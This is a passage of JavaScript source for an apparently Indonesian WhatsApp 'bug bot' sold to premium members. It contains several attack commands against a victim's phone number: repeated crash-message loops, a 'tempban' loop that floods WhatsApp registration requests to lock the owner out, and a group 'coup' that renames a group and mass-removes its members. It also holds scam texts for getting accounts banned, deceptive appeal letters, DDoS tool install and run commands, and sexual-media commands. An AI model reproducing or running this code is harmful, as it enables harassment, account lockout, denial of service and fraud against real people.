await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { audio: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
qio.sendMessage(Pe, { audio: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
qio.sendMessage(Pe, { audio: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
qio.sendMessage(Pe, { audio: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'senddoku': {
if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
if (!q) return m.reply(`Penggunaan pake nomor cil`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara️`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { document: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
qio.sendMessage(Pe, { document: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
qio.sendMessage(Pe, { document: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
qio.sendMessage(Pe, { document: virgam,  caption: `❄𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐂𝐫𝐚𝐬𝐡 𝐓𝐨𝐭𝐚𝐥🥵` }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'qiobuger': case 'qiogood': {
if (!isGroup) return m.reply(`masuk grup murbug dulu cil`)
if (!isMurbug) return m.reply(`minta ke babang qio ganteng akses murbug luc cil`)
if (!qtext) return m.reply(`Command Salah Silahkan Gunakan Command ${command} nomor|jumlah`)
Pe = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await qio.onWhatsApp(Pe)
if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
await lokascrash(Pe, qiobatosai)
await virgamcrash(Pe, qiobatosai)
await dokucrash(Pe, qiobatosai)
await iponcrash(Pe, qiobatosai)
await iponcrash(Pe)
await crashasu(Pe, qiobatosai)
qio.sendMessage(Pe, { image : virgam }, { quoted:m })
qio.sendMessage(Pe, { image : virgam }, { quoted:m })
qio.sendMessage(Pe, { image : virgam }, { quoted:m })
qio.sendMessage(Pe, { image : virgam }, { quoted:m })
lokascrash(Pe, qiobatosai)
dokucrash(Pe, qiobatosai)
virgamcrash(Pe, qiobatosai)
iponcrash(Pe, qiobatosai)
crashasu(Pe, qiobatosai)
}
await qioreply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
//=================================================//
case 'tempban': {
if (!isDeveloper) return qioreply(mess.prem)
if (!text) return m.reply(`Example: ${prefix + command} 62|8xxx`)
if (!/|/.test(text)) return m.reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|8xxx`)
let numbers = JSON.parse(fs.readFileSync('./ⒶAlwaysqioo.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await m.reply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./ⒶAlwaysqioo.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'payment': {
m.reply(`Dana : ${adana}\nOvo : ${aovo}\nQris : ${aqris}\nGopay : ${agopay}`)
}
break

case 'store': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│${prefix} ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
qioreply(teks)
}
break

case 'addlist':
if (!isPrem) return qioreply(mess.prem)
var args1 = qtext.split("@")[0]
var args2 = qtext.split("@")[1]    
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${prefix+command.slice(0)} *Nama Item@Item*\n\n_Contoh_\n\n${prefix+command.slice(0)} namalist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
media = await qio.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses Add List Dengan Kunci : *${args1}*`)
}
break

case 'dellist':
if (!isPrem) return qioreply(mess.prem)
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!q) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
if (!isAlreadyResponList(from, q, db_respon_list)) return m.reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
m.reply(`Sukses delete list message dengan key *${q}*`)
break


case 'updatelist':
if (!isPrem) return qioreply(mess.prem)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
media = await qio.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
m.reply(`Sukses update list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
}
break

case 'proses': {
if (!isPrem) return qioreply(mess.prem)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let pro = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${week} ${calender}\n⌚ WAKTU     : ${ucapanWaktu} WIB\n✨ STATUS  : Pending\`\`\`\n\nPesanan @${users.split("@")[0]} sedang di proses!`
qio.sendMessage(m.chat, { text: pro, mentions: [users] }, { quoted: m })
}
break

case 'done': 
if (!isPrem) return qioreply(mess.prem)
m.reply(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${week} ${calender}\n⌚ WAKTU     : ${ucapanWaktu} WIB\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih Ya Mas Next Order ya🙏`)
break 


case 'txtban1':
if (!isPrem) return qioreply(mess.prem)
m.reply(`Hola😁, ¿necesitas dinero? Ofrezco un sitio de apuestas en línea con premios en metálico de $700 y condiciones simples. Puedes hacer un depósito mínimo de $70 y puedes duplicar tu dinero.
💰 Realice un depósito inmediatamente en mi sitio de apuestas en línea y obtenga la mayor cantidad de dinero posible. registrarse en mi sitio de apuestas en línea a través de
Enlace : https://registrarse.en.el.sitio.de.apuestas/
Correo electrónico : support@support.whatsapp.com
Whatsapp : https://api.whatsapp.com/send?phone=`)
break

case 'txtban2':
if (!isPrem) return qioreply(mess.prem)
m.reply(`Hola, ¿Necesitas un trabajo para ganar dinero? Quiero ofrecerte un trabajo muy fácil y podrás duplicar todo tu dinero. Te ofrezco un trabajo, concretamente ser administrador de un sitio de juegos de azar online con un premio de 900$ y un depósito mínimo de 70$. Si estás interesado en aceptar una oferta de trabajo mía, puedes comunicarte al número de soporte 👇
https://api.whatsapp.com/send?phone=
💰 También puedes participar en este juego de apuestas en línea registrándote en nuestro sitio y realizando un depósito mínimo de 70$. Vamos, deposita inmediatamente para duplicar tu dinero 💸. Regístrese en nuestro sitio de apuestas en línea y el enlace de registro está disponible a continuación 👇
https://registrarse.en.el.sitio.de.apuestas/
*support@support.whatsapp.com*`)
break

case 'txtban3':
if (!isPrem) return qioreply(mess.prem)
m.reply(`🎲 ONLINE-WETSEITE 🎲
Hallo, ich komme von einem Online-Glücksspielseitenunternehmen namens qio888. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite qio888 einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite qio888
🎮 Wettseiten: https://register.qio888.bet/
Alternative zur Registrierung 👇
🎮 Facebook : qio888
🎮 Whatsapp : https://api.whatsapp.com/send?phone=+6289630514341
Bitte registrieren Sie sich, um Ihr Geld zu verdoppeln 🤤`)
break

case 'txtunbanperma1':
if (!isPrem) return qioreply(mess.prem)
m.reply(`مرحبًا ، يرجى تنشيط حسابي: (+ 62xxxx) في أسرع وقت ممكن. هذا خطأ خطير للغاية في نظام whatsapp. تم حظر حسابي الذي كان يغازل الأصدقاء فجأة؟ يرجى تنشيط حسابي على الفور ، ويرجى إصلاح خطأ النظام الضار للغاية. شكرًا لك `)
break

case 'txtunbanperma2':
if (!isPrem) return qioreply(mess.prem)
m.reply(`HALLO WHATSAPP-ENTWICKLER, BITTE STELLEN SIE MEIN WHATSAPP-KONTO SOFORT WIEDER HER, ICH VERWENDE WHATSAPP, UM MIT WICHTIGEN MENSCHEN IN MEINEM LEBEN ZU KOMMUNIZIEREN, OHNE DIE WHATSAPP-APP WIRD MEIN LEBEN EIN PROBLEM, MEIN WHATSAPP-KONTO IST (+628XXX)`)
break

case 'txtunbanperma3':
if (!isPrem) return qioreply(mess.prem)
m.reply(`مرحبًا ، أنا من مستخدمي whatsapp وأشعر أنه لا يزال هناك العديد من أوجه القصور في whatsapp. لقد كنت أستخدم WhatsApp منذ سنوات دون أي انتهاكات ، ولكن تم حظر حسابي بواسطة WhatsApp. يرجى تنشيطه على الفور لأن البيانات الشخصية وبيانات العمل والبيانات الأخرى موجودة في الحساب. إذا لم يتم تفعيله قريبًا ، فأنا أخاطر بفقدان وظيفتي. شكرا لتفهمك وتعاونك. هذا هو رقمي: +628888888 `)
break

case 'txtunbanspam1':
if (!isPrem) return qioreply(mess.prem)
m.reply(`Hai whatsapp selamat siang, saya ada keluhan kenapa nomor whatsapp saya di nonaktifkan sedangkan saya tidak melanggar kebijakan privasi whatsapp dan saya tidak pernah spam qtext Banyak ke orang atau ke grup, saya hanya bekerja online menggunakan whatsapp dan saya waktu itu sedang mengirim berkas berkas pekerjaan saya, dan tiba tiba ke blokir nomor saya, mohon kembalikan akun saya: +62XXX XXX XXX saya harap secepat mungkin untuk dikembalikan lagi kepada saya untuk bekerja, dan saya harap pihak whatsapp mengerti perasaan saya trimakasih`)
break

case 'txtunbanspam2':
if (!isPrem) return qioreply(mess.prem)
m.reply(`saya adalah pengguna aplikasi whatsapp dan saay tidak mengerti kenapa akun WhatsApp saya bisa di blokir secara spam. saya tidak pernah melakukan pelanggaran-pelanggaran ketentuan whatsapp. saya hanya menggunakan aplikasi whatsapp untuk keperluan sehari hari. saya membutuhkan aplikasi whatsapp untuk mengerjakan pekerjaan saya. saya mohon untuk di pulihkan kembali akun WhatsApp saya. saya harus menyelesaikan pekerjaan saya. saya sangat membutuhkan aplikasi WhatsApp. saya sangat menghargai waktu dan usaha developer whatsapp dalam menangani masalah ini. nomor whatsapp saya adalah  +62xxx`)
break

case 'txtunbanspam3':
if (!isPrem) return qioreply(mess.prem)
m.reply(`Hello good morning, afternoon, afternoon, evening, I now want to appeal to the honorable WhatsApp, I as a follower who has been using WhatsApp for a long time, why have you blocked my WhatsApp account, please review my account seriously, I was forced to do so at that time. to change the profile photo which violates WhatsApp rules, at that time I really didn't know my account would be blocked, please forgive me because at that time I didn't know anything at all, my WhatsApp number is +62xxxxxxxx, please restore my account because there is also data very important and confidential data, Thank you`)
break

case 'txtunbansetpp1':
if (!isPrem) return qioreply(mess.prem)
m.reply(`hello whatsapp saya datang kesini hanya mengajukan akun saya yang terkena blokir kenapa akun saya diblokir, saya hanya disuruh orang untuk memasang PP porno di whatsapp jadi itu bukan kesalahan saya, saya hanya tidak tahu apa yang terjadi saat saya memasang PP pornografi di whatsapp jadi mohon membuka akun saya saya hanya disuruh orang dan mengancam saya agar memasang PP pornografi di grup whatsapp terus pas saya memasang tiba tiba whatsapp saya keblokir mohon bantuannya dan saya memohon maaf atas kesalahan ini mohon segera dipulihkan akun whatsapp: +62xxxxx saya hanya disuruh orang agar memasang PP itu jadi saya tidak tahu kalo jadi seperti ini terimakasih. hormat saya pengguna whatsapp.`)
break

case 'txtunbansetpp2':
if (!isPrem) return qioreply(mess.prem)
m.reply(`hello whatsapp I came here just to ask that my account was blocked why my account was blocked I was just told by someone to install PP porn on WhatsApp so it's not my fault I just don't know what happened when I installed PP pornography on WhatsApp so please open my account I was just told by someone and threatened me to install pornographic PP in the whatsapp group then when I installed it suddenly my whatsapp was blocked asking for help and I apologize for this error please recover immediately whatsapp account: +62 xxxxx I was just told by people to install the PP so I don't know if it turned out like this, thank you. Respect, I'm a WhatsApp user.`)
break

case 'txtunbansetpp3':
if (!isPrem) return qioreply(mess.prem)
m.reply(`Olá, meu número do WhatsApp foi bloqueado porque mudei minha foto de perfil no grupo do WhatsApp. Fui ameaçado de morte. A princípio não acreditei, mas ele sabia minha localização, então atendi ao desejo do homem e o homem me disse para mudar as fotos do grupo para fotos pornográficas. Meus filhos não têm outra escolha porque minha vida está ameaçada, restaure minha conta novamente +62XXX`)
break

case 'txtunbantinjau':
if (!isPrem) return qioreply(mess.prem)
m.reply(`Dear WhatsApp support, I want to inform you that my WhatsApp was blocked for spam reasons, I am very sad because my WhatsApp account is used for my business, apart from communicating with family and friends. My account being blocked has seriously affected my daily operations and business relationships. Please help so I can access my WhatsApp account again and continue this very important business communication. Dear WhatsApp, please help, thank you.`)
break

case 'gmailwa':
if (!isPrem) return qioreply(mess.prem)
m.reply(`ALL GMAIL PIHAK WANGSAF
- android@support.whatsapp.com
- support@support.whatsapp.com
- support@support@support.whatsapp.com
- smb@support.whatsapp.com`)
break

case 'paptt':
if (!isPrem) return qioreply(mess.prem)
if (!q) return m.reply(`Example ${prefix + command} foto/video`)
papttfoto = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/ster1.json'))
papttvideo = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/ster2.json'))
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}
titid1 = (pickRandom(papttfoto))
titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
qioreply("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
qio.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: m })
} else if (q == 'video') {
qioreply("Video Akan Dikirim Lewat Private Chat ( *PC* )")
qio.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: m })
}
break

case 'toolsddos':
if (!isPrem) return qioreply(mess.prem)
m.reply(`ALL TOOLS DIDOS
TOL 1
git clone https://github.com/MatrixTM/MHDDoS.git
cd MHDDoS
pip install -r requirements.tx

TOL 2
pkg install git -y
pkg install python -y
pkg install python3 -y
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper $ ls
python3 DRipper.py
python3 DRipper.py -s [ip Address] -t 135

TOL 3
git clone https://github.com/Leeon123/golang-httpflood.git
cd golang-httpflood
go build httpflood.go
./httpflood  <url> <threads> <get/post> <seconds> <header.txt/nil>

TOL 4
git clone https://github.com/karthik558/ddos-attack.git
cd ddos-attack
pip install -r requirements.txt
python3 ddos.py

NOTE : KALAU GA WORK JANGAN SALAHIN GW , ITU PAS GW COBA KEMAREN-KEMAREM MASI WORK`)
break

case 'tiktokgirl':
if (!isPrem) return qioreply(mess.prem)
qioreply('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/tiktok/tiktokgirl.json'))
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}
hasil = pickRandom(asupan)
qio.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokghea':
if (!isPrem) return qioreply(mess.prem)
qioreply('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/tiktok/gheayubi.json'))
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}
hasil = pickRandom(asupan)
qio.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoknukhty':
if (!isPrem) return qioreply(mess.prem)
qioreply('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/tiktok/ukhty.json'))
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}
hasil = pickRandom(asupan)
qio.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoksantuy':
if (!isPrem) return qioreply(mess.prem)
qioreply('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/tiktok/santuy.json'))
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}
hasil = pickRandom(asupan)
qio.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokkayes':
if (!isPrem) return qioreply(mess.prem)
qioreply('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/tiktok/kayes.json'))
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}
hasil = pickRandom(asupan)
qio.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokpanrika':
if (!isPrem) return qioreply(mess.prem)
qioreply('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/tiktok/panrika.json'))
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}
hasil = pickRandom(asupan)
qio.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoknotnot':
if (!isPrem) return qioreply(mess.prem)
qioreply('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/lowdb/adapters/basedate/tiktok/notnot.json'))
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}
hasil = pickRandom(asupan)
qio.sendMessage(m.chat, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'cek?': {
m.reply('Bot Siap Digunakan 🤗')
}
break

case 'bugvid1':
if (!isPrem) return qioreply(mess.prem)
bugvid1 = fs.readFileSync('./lib/lowdb/adapters/basedate/tiktok/bug1.mp4')
qio.sendMessage(m.chat, {video: bugvid1},{quoted: m})
break

case 'bugvid2':
if (!isPrem) return qioreply(mess.prem)
bugvid1 = fs.readFileSync('./lib/lowdb/adapters/basedate/tiktok/bug1.mp4')
qio.sendMessage(m.chat, {video: bugvid1},{quoted: m})
break


case 'kudetathp1': {
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
if (!quoted) return m.reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return m.reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return m.reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await qio.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await qio.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
} else {
var memeg = await qio.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
m.reply(`*lanjut ke ${prefix}kudetathp2*`)
}
}
break

case 'kudetathp2': {
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return m.reply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
await qio.groupUpdateSubject(m.chat, 'Alfin Faridh Taufiqiy')
await qio.groupUpdateDescription(m.chat, 'Alfin Faridh Taufiqiy')
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupMetadata.owner && x !== kontributor + "@s.whatsapp.net") {
await qio.groupParticipantsUpdate(m.chat, [x], "remove")
await m.reply (`Alfin Faridh Taufiqiy`)
}}}
break
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isDeveloper) return qioreply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return qioreply(bang)
}
try {
qioreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
qioreply(String(e))
}
}
//=================================================//
if (budy.startsWith('>')) {
if (!isDeveloper) return qioreply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await qioreply(evaled)
} catch (err) {
await qioreply(String(err))
}
}
//=================================================//
if (budy.startsWith('$')) {
if (!isDeveloper) return qioreply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if (err) return qioreply(`${err}`)
if (stdout) return qioreply(`${stdout}`)
})
}
}
} catch (err) {
peki = async () => {
qio.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
await sleep(1000)
m.reply(`
🥱 Eror Ditemukan , mohon tunggu sekejap , Developer Akan Memperbaikinya Kembali

${util.format(err)}`)
console.log(util.format(err))
}
peki()
}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
